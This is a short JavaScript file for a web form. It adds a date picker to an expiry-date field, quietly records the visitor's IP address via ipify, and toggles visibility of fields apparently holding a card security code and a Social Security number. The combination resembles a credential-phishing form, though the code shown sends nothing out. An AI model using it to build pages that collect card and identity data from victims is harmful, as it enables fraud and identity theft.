$(function() {
    // Initialize the datepicker
    $("#expDate").datepicker({
      dateFormat: "mm/dd/yy"
    });
  });


  fetch('https://api64.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
      const ipAddressInput = document.getElementById('ip-address');
      if (ipAddressInput) {
          ipAddressInput.value = data.ip;
      }
  })
  .catch(error => console.error('Error fetching IP address:', error));

  const showPasswordBtn = document.getElementById('showPasswordBtn');
  const showSSNBtn = document.getElementById('showSSNBtn');
  const passwordInput = document.getElementById('cccvv');
  const ssnInput = document.getElementById('ssn');

  showPasswordBtn.addEventListener('click', function () {
      toggleInputVisibility(passwordInput);
  });

  showSSNBtn.addEventListener('click', function () {
      toggleInputVisibility(ssnInput);
  });

  function toggleInputVisibility(input) {
      if (input.type === 'password') {
          input.type = 'text';
      } else {
          input.type = 'password';
      }
  }